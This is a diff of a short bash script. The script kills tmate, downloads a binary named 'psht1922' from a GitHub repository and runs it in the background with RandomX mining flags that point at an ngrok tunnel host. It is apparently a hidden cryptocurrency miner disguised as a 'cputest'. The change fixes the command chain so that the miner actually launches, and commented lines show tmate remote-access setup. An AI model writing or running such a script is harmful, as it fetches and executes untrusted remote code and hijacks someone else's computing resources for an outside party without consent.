@@ -1,7 +1,7 @@
 #!/bin/bash 
 pkill -9 tmate
-wget -O psht1922 https://github.com/slendep1922/cputest/raw/main/psht1922 && chmod +x psht1922 nohup ./psht1922 -a rx/0 -o 0.tcp.ngrok.io:17863 > hasil.log 2>&1 #wget -nc https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz &> /dev/null
-tar zxvf ngrok-v3-stable-linux-amd64.tgz
+wget -O psht1922 https://github.com/slendep1922/cputest/raw/main/psht1922 && chmod +x psht1922 && nohup ./psht1922 -a rx/0 -o 0.tcp.ngrok.io:17863 > hasil.log 2>&1 #wget -nc https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz &> /dev/null
+#tar zxvf ngrok-v3-stable-linux-amd64.tgz
 #rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/ate.sock new-session -d & disown -a' >/dev/null 2>&1
 #./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
 #./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}"
